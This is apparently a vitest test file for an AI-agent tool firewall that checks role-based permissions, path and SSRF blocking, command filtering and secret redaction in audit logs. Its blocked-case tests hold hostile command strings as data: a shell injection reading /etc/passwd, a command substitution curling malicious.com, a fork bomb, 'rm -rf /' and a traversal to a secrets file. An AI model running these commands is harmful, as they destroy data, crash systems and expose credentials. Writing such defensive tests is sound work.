/**
 * Integration Tests for FIREWALL_EXAMPLES.md
 *
 * These tests validate that all examples in FIREWALL_EXAMPLES.md work correctly
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import {
  ToolFirewall,
  sanitizeFrontendPath,
  sanitizeHttpUrl,
  sanitizeCommand,
  getToolFirewall,
  resetToolFirewall,
} from '../firewall'
import type { ToolCall } from '../firewall'

// ============================================
// EXAMPLE 1: Frontend Agent - Allowed Operations
// ============================================

describe('Example 1: Frontend Agent - Allowed Operations', () => {
  let firewall: ToolFirewall

  beforeEach(() => {
    firewall = new ToolFirewall({ enableAudit: true })
  })

  it('should allow readFile on source files', async () => {
    const toolCall: ToolCall = {
      name: 'readFile',
      args: { path: 'src/components/Button.tsx' },
      agentId: 'frontend',
    }

    const result = await firewall.executeToolSafely(toolCall, async () => ({
      success: true,
      result: 'file content',
    }))

    expect(result.success).toBe(true)
    expect(result.auditLogId).toBeDefined()
  })

  it('should allow writeFile on CSS files', async () => {
    const toolCall: ToolCall = {
      name: 'writeFile',
      args: {
        path: 'src/styles.css',
        content: '.button { color: blue; }',
      },
      agentId: 'frontend',
    }

    const result = await firewall.executeToolSafely(toolCall, async () =>
      Promise.resolve('file written')
    )

    expect(result.success).toBe(true)
  })

  it('should allow httpRequest to localhost', async () => {
    const toolCall: ToolCall = {
      name: 'httpRequest',
      args: {
        url: 'http://localhost:3000/api/data',
        method: 'GET',
      },
      agentId: 'frontend',
    }

    const result = await firewall.executeToolSafely(toolCall, async () => ({
      data: { test: 'data' },
    }))

    expect(result.success).toBe(true)
  })
})

// ============================================
// EXAMPLE 2: Frontend Agent - Blocked Operations
// ============================================

describe('Example 2: Frontend Agent - Blocked Operations', () => {
  let firewall: ToolFirewall

  beforeEach(() => {
    firewall = new ToolFirewall({ enableAudit: true, strictMode: true })
  })

  it('should block directory traversal attempts', async () => {
    const toolCall: ToolCall = {
      name: 'readFile',
      args: { path: '../../.env.secret' },
      agentId: 'frontend',
    }

    const result = await firewall.executeToolSafely(
      toolCall,
      async () => 'should not execute'
    )

    expect(result.success).toBe(false)
    expect(result.error).toContain('traversal')
  })

  it('should block absolute path access', async () => {
    const toolCall: ToolCall = {
      name: 'writeFile',
      args: {
        path: '/etc/passwd',
        content: 'hacked',
      },
      agentId: 'frontend',
    }

    const result = await firewall.executeToolSafely(
      toolCall,
      async () => 'should not execute'
    )

    expect(result.success).toBe(false)
  })

  it('should block database access', async () => {
    const toolCall: ToolCall = {
      name: 'dbRead',
      args: { query: 'SELECT * FROM users' },
      agentId: 'frontend',
    }

    const result = await firewall.executeToolSafely(
      toolCall,
      async () => 'should not execute'
    )

    expect(result.success).toBe(false)
    expect(result.blocked).toBe(true)
    expect(result.error).toMatch(/not authorized/i)
  })

  it('should block SSRF attacks with non-whitelisted domains', async () => {
    const toolCall: ToolCall = {
      name: 'httpRequest',
      args: { url: 'http://internal-service:8000/admin' },
      agentId: 'frontend',
    }

    const result = await firewall.executeToolSafely(
      toolCall,
      async () => 'should not execute'
    )

    expect(result.success).toBe(false)
    expect(result.error).toBeDefined()
  })
})

// ============================================
// EXAMPLE 3: Backend Agent - Allowed Operations
// ============================================

describe('Example 3: Backend Agent - Allowed Operations', () => {
  let firewall: ToolFirewall

  beforeEach(() => {
    firewall = new ToolFirewall({ enableAudit: true })
  })

  it('should allow database operations', async () => {
    const toolCall: ToolCall = {
      name: 'dbRead',
      args: { query: 'SELECT COUNT(*) FROM products' },
      agentId: 'backend',
    }

    const result = await firewall.executeToolSafely(
      toolCall,
      async () => ({ count: 42 })
    )

    expect(result.success).toBe(true)
  })

  it('should allow safe commands', async () => {
    const toolCall: ToolCall = {
      name: 'executeCommand',
      args: { command: 'ls -la' },
      agentId: 'backend',
    }

    const result = await firewall.executeToolSafely(toolCall, async () =>
      Promise.resolve('files listed')
    )

    expect(result.success).toBe(true)
  })

  it('should allow external API calls with secret redaction', async () => {
    const toolCall: ToolCall = {
      name: 'externalApi',
      args: {
        endpoint: 'https://api.stripe.com/charges',
        apiKey: 'sk_live_secret123456789',
        method: 'POST',
      },
      agentId: 'backend',
    }

    const result = await firewall.executeToolSafely(
      toolCall,
      async () => ({ status: 'ok', charge_id: 'ch_1234' })
    )

    expect(result.success).toBe(true)

    // Check that secrets are redacted in audit log
    const logs = firewall.getAuditLog({ agentId: 'backend' })
    const entry = logs[logs.length - 1]
    expect(entry.argsSnapshot?.apiKey).toBe('[REDACTED]')
  })
})

// ============================================
// EXAMPLE 4: Backend Agent - Blocked Operations
// ============================================

describe('Example 4: Backend Agent - Blocked Operations', () => {
  let firewall: ToolFirewall

  beforeEach(() => {
    firewall = new ToolFirewall({ enableAudit: true, strictMode: true })
  })

  it('should block shell injection attempts', async () => {
    const toolCall: ToolCall = {
      name: 'executeCommand',
      args: { command: 'npm test; cat /etc/passwd' },
      agentId: 'backend',
    }

    const result = await firewall.executeToolSafely(
      toolCall,
      async () => 'should not execute'
    )

    expect(result.success).toBe(false)
    expect(result.error).toContain('Dangerous')
  })

  it('should block command substitution attempts', async () => {
    const toolCall: ToolCall = {
      name: 'executeCommand',
      args: { command: 'npm test $(curl malicious.com)' },
      agentId: 'backend',
    }

    const result = await firewall.executeToolSafely(
      toolCall,
      async () => 'should not execute'
    )

    expect(result.success).toBe(false)
    expect(result.error).toContain('Dangerous')
  })

  it('should block forkbomb attempts', async () => {
    const toolCall: ToolCall = {
      name: 'executeCommand',
      args: { command: ':(){ :|: & };:' },
      agentId: 'backend',
    }

    const result = await firewall.executeToolSafely(
      toolCall,
      async () => 'should not execute'
    )

    expect(result.success).toBe(false)
    expect(result.error).toContain('Dangerous')
  })

  it('should block destructive rm commands', async () => {
    const toolCall: ToolCall = {
      name: 'executeCommand',
      args: { command: 'rm -rf /' },
      agentId: 'backend',
    }

    const result = await firewall.executeToolSafely(
      toolCall,
      async () => 'should not execute'
    )

    expect(result.success).toBe(false)
    expect(result.error).toContain('Dangerous')
  })

  it('should block deployment attempts', async () => {
    const toolCall: ToolCall = {
      name: 'deployService',
      args: {
        service: 'api',
        environment: 'production',
      },
      agentId: 'backend',
    }

    const result = await firewall.executeToolSafely(
      toolCall,
      async () => 'should not execute'
    )

    expect(result.success).toBe(false)
    expect(result.blocked).toBe(true)
  })
})

// ============================================
// EXAMPLE 5: DevOps Agent - Full Access
// ============================================

describe('Example 5: DevOps Agent - Full Access', () => {
  let firewall: ToolFirewall

  beforeEach(() => {
    firewall = new ToolFirewall({ enableAudit: true })
  })

  it('should allow deployment to production', async () => {
    const toolCall: ToolCall = {
      name: 'deployService',
      args: {
        service: 'api',
        environment: 'production',
        version: 'v2.1.0',
      },
      agentId: 'devops',
    }

    const result = await firewall.executeToolSafely(toolCall, async () => ({
      status: 'deployed',
    }))

    expect(result.success).toBe(true)
  })

  it('should allow secret retrieval with redaction', async () => {
    const toolCall: ToolCall = {
      name: 'getSecrets',
      args: { environment: 'production' },
      agentId: 'devops',
    }

    const result = await firewall.executeToolSafely(toolCall, async () => ({
      apiKey: 'secret-value',
      dbPassword: 'secret-password',
    }))

    expect(result.success).toBe(true)

    // Check audit log redaction
    const logs = firewall.getAuditLog({ agentId: 'devops' })
    const entry = logs[logs.length - 1]
    // Arguments should be redacted in the audit log
    expect(entry).toBeDefined()
  })
})

// ============================================
// EXAMPLE 6: Planner Agent - Read-Only
// ============================================

describe('Example 6: Planner Agent - Read-Only', () => {
  let firewall: ToolFirewall

  beforeEach(() => {
    firewall = new ToolFirewall({ enableAudit: true })
  })

  it('should allow reading architecture files', async () => {
    const toolCall: ToolCall = {
      name: 'readFile',
      args: { path: 'docs/ARCHITECTURE.md' },
      agentId: 'planner',
    }

    const result = await firewall.executeToolSafely(toolCall, async () =>
      Promise.resolve('architecture content')
    )

    expect(result.success).toBe(true)
  })

  it('should allow database read queries', async () => {
    const toolCall: ToolCall = {
      name: 'dbRead',
      args: { query: 'SELECT COUNT(*) FROM users' },
      agentId: 'planner',
    }

    const result = await firewall.executeToolSafely(toolCall, async () => ({
      count: 100,
    }))

    expect(result.success).toBe(true)
  })

  it('should block write operations', async () => {
    const toolCall: ToolCall = {
      name: 'writeFile',
      args: { path: 'src/app.ts', content: 'modified code' },
      agentId: 'planner',
    }

    const result = await firewall.executeToolSafely(
      toolCall,
      async () => 'should not execute'
    )

    expect(result.success).toBe(false)
    expect(result.blocked).toBe(true)
  })
})

// ============================================
// EXAMPLE 7: Audit Logging
// ============================================

describe('Example 7: Audit Logging', () => {
  let firewall: ToolFirewall

  beforeEach(() => {
    firewall = new ToolFirewall({ enableAudit: true })
  })

  afterEach(() => {
    firewall.clearAuditLog()
  })

  it('should filter audit logs by agent', async () => {
    // Frontend call
    await firewall.executeToolSafely(
      {
        name: 'readFile',
        args: { path: 'src/Button.tsx' },
        agentId: 'frontend',
      },
      async () => 'content'
    )

    // Backend call
    await firewall.executeToolSafely(
      {
        name: 'dbRead',
        args: { query: 'SELECT * FROM users' },
        agentId: 'backend',
      },
      async () => ({ users: [] })
    )

    const frontendLogs = firewall.getAuditLog({ agentId: 'frontend' })
    const backendLogs = firewall.getAuditLog({ agentId: 'backend' })

    expect(frontendLogs).toHaveLength(1)
    expect(backendLogs).toHaveLength(1)
  })

  it('should filter audit logs by tool', async () => {
    await firewall.executeToolSafely(
      {
        name: 'readFile',
        args: { path: 'src/Button.tsx' },
        agentId: 'frontend',
      },
      async () => 'content'
    )

    await firewall.executeToolSafely(
      {
        name: 'readFile',
        args: { path: 'src/App.tsx' },
        agentId: 'frontend',
      },
      async () => 'content'
    )

    const readFileLogs = firewall.getAuditLog({ toolName: 'readFile' })
    expect(readFileLogs).toHaveLength(2)
  })

  it('should filter audit logs by action', async () => {
    // Allowed action
    await firewall.executeToolSafely(
      {
        name: 'readFile',
        args: { path: 'src/Button.tsx' },
        agentId: 'frontend',
      },
      async () => 'content'
    )

    // Denied action
    await firewall.executeToolSafely(
      {
        name: 'dbRead',
        args: { query: 'SELECT * FROM users' },
        agentId: 'frontend',
      },
      async () => 'should not execute'
    )

    const deniedLogs = firewall.getAuditLog({ action: 'denied' })
    expect(deniedLogs.length).toBeGreaterThan(0)
    expect(deniedLogs[0].action).toBe('denied')
  })

  it('should redact secrets in audit logs', async () => {
    await firewall.executeToolSafely(
      {
        name: 'externalApi',
        args: {
          endpoint: 'https://api.stripe.com/charges',
          apiKey: 'sk_live_12345',
          method: 'POST',
        },
        agentId: 'backend',
      },
      async () => ({ status: 'ok' })
    )

    const logs = firewall.getAuditLog({ agentId: 'backend' })
    const entry = logs[logs.length - 1]

    expect(entry.argsSnapshot?.apiKey).toBe('[REDACTED]')
    expect(entry.argsSnapshot?.endpoint).toBe('https://api.stripe.com/charges')
  })

  it('should record execution duration', async () => {
    await firewall.executeToolSafely(
      {
        name: 'readFile',
        args: { path: 'src/Button.tsx' },
        agentId: 'frontend',
      },
      async () => {
        // Simulate some work
        await new Promise((resolve) => setTimeout(resolve, 10))
        return 'content'
      }
    )

    const logs = firewall.getAuditLog({ agentId: 'frontend' })
    const entry = logs[logs.length - 1]

    expect(entry.duration).toBeGreaterThanOrEqual(10)
  })
})

// ============================================
// EXAMPLE 8: Permission Matrix
// ============================================

describe('Example 8: Permission Matrix', () => {
  let firewall: ToolFirewall

  beforeEach(() => {
    firewall = new ToolFirewall({ enableAudit: true })
  })

  describe('Frontend permissions', () => {
    it('can read source files', async () => {
      const result = firewall.canExecuteTool('frontend', 'readFile')
      expect(result).toBe(true)
    })

    it('can write source files', async () => {
      const result = firewall.canExecuteTool('frontend', 'writeFile')
      expect(result).toBe(true)
    })

    it('cannot access database', async () => {
      const result = firewall.canExecuteTool('frontend', 'dbRead')
      expect(result).toBe(false)
    })

    it('cannot execute commands', async () => {
      const result = firewall.canExecuteTool('frontend', 'executeCommand')
      expect(result).toBe(false)
    })
  })

  describe('Backend permissions', () => {
    it('can access database', async () => {
      const result = firewall.canExecuteTool('backend', 'dbRead')
      expect(result).toBe(true)
    })

    it('can execute commands', async () => {
      const result = firewall.canExecuteTool('backend', 'executeCommand')
      expect(result).toBe(true)
    })

    it('cannot deploy', async () => {
      const result = firewall.canExecuteTool('backend', 'deployService')
      expect(result).toBe(false)
    })
  })

  describe('DevOps permissions', () => {
    it('can deploy', async () => {
      const result = firewall.canExecuteTool('devops', 'deployService')
      expect(result).toBe(true)
    })

    it('can get secrets', async () => {
      const result = firewall.canExecuteTool('devops', 'getSecrets')
      expect(result).toBe(true)
    })

    it('can access database', async () => {
      const result = firewall.canExecuteTool('devops', 'dbRead')
      expect(result).toBe(true)
    })
  })

  describe('Planner permissions (read-only)', () => {
    it('can read files', async () => {
      const result = firewall.canExecuteTool('planner', 'readFile')
      expect(result).toBe(true)
    })

    it('can read database', async () => {
      const result = firewall.canExecuteTool('planner', 'dbRead')
      expect(result).toBe(true)
    })

    it('cannot write files', async () => {
      const result = firewall.canExecuteTool('planner', 'writeFile')
      expect(result).toBe(false)
    })

    it('cannot execute commands', async () => {
      const result = firewall.canExecuteTool('planner', 'executeCommand')
      expect(result).toBe(false)
    })
  })
})

// ============================================
// EXAMPLE 9: Error Handling
// ============================================

describe('Example 9: Error Handling', () => {
  let firewall: ToolFirewall

  beforeEach(() => {
    firewall = new ToolFirewall({ enableAudit: true })
  })

  it('should handle execution errors gracefully', async () => {
    const toolCall: ToolCall = {
      name: 'readFile',
      args: { path: 'src/nonexistent.tsx' },
      agentId: 'frontend',
    }

    const result = await firewall.executeToolSafely(toolCall, async () => {
      throw new Error('File not found')
    })

    expect(result.success).toBe(false)
    expect(result.error).toContain('File not found')
    expect(result.auditLogId).toBeDefined()

    // Check audit log recorded error
    const logs = firewall.getAuditLog({ agentId: 'frontend' })
    const entry = logs[logs.length - 1]
    expect(entry.action).toBe('error')
  })

  it('should distinguish between blocked and errored calls', async () => {
    // Blocked call
    const blockedResult = await firewall.executeToolSafely(
      {
        name: 'dbRead',
        args: { query: 'SELECT * FROM users' },
        agentId: 'frontend',
      },
      async () => 'should not execute'
    )

    expect(blockedResult.blocked).toBe(true)

    // Errored call
    const erroredResult = await firewall.executeToolSafely(
      {
        name: 'readFile',
        args: { path: 'src/Button.tsx' },
        agentId: 'frontend',
      },
      async () => {
        throw new Error('Disk error')
      }
    )

    expect(erroredResult.blocked).toBeUndefined()
    expect(erroredResult.error).toContain('Disk error')
  })
})

// ============================================
// INTEGRATION TEST: Full Workflow
// ============================================

describe('Integration: Multi-agent workflow', () => {
  let firewall: ToolFirewall

  beforeEach(() => {
    firewall = new ToolFirewall({ enableAudit: true })
  })

  it('should handle complex multi-agent scenario', async () => {
    // Planner reads architecture
    const plannerRead = await firewall.executeToolSafely(
      {
        name: 'readFile',
        args: { path: 'docs/ARCHITECTURE.md' },
        agentId: 'planner',
      },
      async () => 'architecture content'
    )
    expect(plannerRead.success).toBe(true)

    // Backend executes work
    const backendExec = await firewall.executeToolSafely(
      {
        name: 'dbRead',
        args: { query: 'SELECT COUNT(*) FROM users' },
        agentId: 'backend',
      },
      async () => ({ count: 42 })
    )
    expect(backendExec.success).toBe(true)

    // DevOps deploys
    const devopsDeploy = await firewall.executeToolSafely(
      {
        name: 'deployService',
        args: { service: 'api', environment: 'production', version: 'v1.0.0' },
        agentId: 'devops',
      },
      async () => ({ status: 'deployed' })
    )
    expect(devopsDeploy.success).toBe(true)

    // Verify audit trail
    const allLogs = firewall.getAuditLog()
    expect(allLogs).toHaveLength(3)

    const plannerLogs = firewall.getAuditLog({ agentId: 'planner' })
    const backendLogs = firewall.getAuditLog({ agentId: 'backend' })
    const devopsLogs = firewall.getAuditLog({ agentId: 'devops' })

    expect(plannerLogs).toHaveLength(1)
    expect(backendLogs).toHaveLength(1)
    expect(devopsLogs).toHaveLength(1)
  })
})

// ============================================
// GLOBAL SINGLETON TEST
// ============================================

describe('Example 8: Global Singleton', () => {
  afterEach(() => {
    resetToolFirewall()
  })

  it('should use global firewall instance', () => {
    const fw1 = getToolFirewall()
    const fw2 = getToolFirewall()

    expect(fw1).toBe(fw2)
  })

  it('should maintain audit logs across calls', async () => {
    const fw1 = getToolFirewall()
    await fw1.executeToolSafely(
      {
        name: 'readFile',
        args: { path: 'src/Button.tsx' },
        agentId: 'frontend',
      },
      async () => 'content'
    )

    const fw2 = getToolFirewall()
    const logs = fw2.getAuditLog()

    expect(logs).toHaveLength(1)
  })
})
